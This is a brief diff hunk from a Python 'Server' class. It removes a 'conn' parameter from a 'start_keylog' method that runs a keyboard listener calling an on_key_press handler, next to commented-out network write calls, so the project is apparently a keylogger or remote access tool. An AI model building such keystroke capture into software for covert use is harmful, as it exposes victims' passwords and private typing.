@@ -312,7 +312,7 @@ class Server:
     #     self.nw.write(s)
     #     self.nw.flush()
 
-    def start_keylog (self, conn):
+    def start_keylog (self):
         with keyboard.Listener(on_press = self.on_key_press) as listener:
                 listener.join()
     
